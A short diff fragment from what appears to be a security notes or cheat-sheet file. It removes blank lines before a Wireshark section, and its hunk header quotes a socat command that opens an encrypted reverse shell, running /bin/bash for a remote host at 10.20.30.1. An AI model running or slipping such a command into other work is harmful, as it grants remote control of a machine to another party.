@@ -287,9 +287,6 @@ socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
 
   ```
 
-
-
-
 ## Wireshark
 - statistical of
   - protocol
